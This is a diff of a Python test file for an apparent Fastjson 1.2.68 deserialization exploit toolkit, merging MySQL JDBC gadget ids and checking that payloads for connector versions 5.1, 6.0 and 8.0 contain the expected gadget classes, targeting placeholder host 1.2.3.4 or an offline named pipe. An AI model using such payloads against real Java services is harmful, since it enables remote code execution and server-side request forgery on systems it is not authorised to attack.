@@ -33,8 +33,7 @@ def test_list_gadgets_covers_notes():
         "io5_write",
         "io_final",
         "io_read_error",
-        "mysql_jdbc_51",
-        "mysql_jdbc_80",
+        "mysql_jdbc",
         "postgresql_ssrf",
     }
     hidden_writes = {
@@ -86,6 +85,32 @@ def test_mysql51_shape():
     assert "JDBC4Connection" in p
     assert "ServerStatusDiffInterceptor" in p
     assert "1.2.3.4" in p
+
+
+def test_mysql_jdbc_merged_versions_and_offline():
+    from fastjson_toolkit.poc.v1_2_68.payloads import build_mysql_jdbc
+
+    p51 = build_payload("mysql_jdbc", mysql_version="5.1", host="1.2.3.4")
+    assert "JDBC4Connection" in p51
+    p60 = build_payload("mysql_jdbc", mysql_version="6.0", host="1.2.3.4", port=3308)
+    assert "LoadBalancedMySQLConnection" in p60
+    p80 = build_payload("mysql_jdbc", mysql_version="8.0", host="1.2.3.4")
+    assert "ReplicationMySQLConnection" in p80
+    # 旧 id 别名
+    assert "JDBC4Connection" in build_payload("mysql_jdbc_51", host="h")
+    offline = build_mysql_jdbc(
+        "5.1",
+        host="xxx",
+        outbound=False,
+        named_pipe_path="/tmp/mysql.pcap",
+    )
+    assert "NamedPipeSocketFactory" in offline
+    assert "/tmp/mysql.pcap" in offline
+    offline60 = build_mysql_jdbc("6.0", host="xxx", outbound=False)
+    assert "NamedPipeSocketFactory" in offline60
+    offline80 = build_mysql_jdbc("8.0", host="xxx", outbound=False)
+    assert "com.mysql.cj.protocol.NamedPipeSocketFactory" in offline80
+    assert '"path":"/tmp/mysql.pcap"' in offline80
 
 
 def test_io_read_error_multi_bytes():
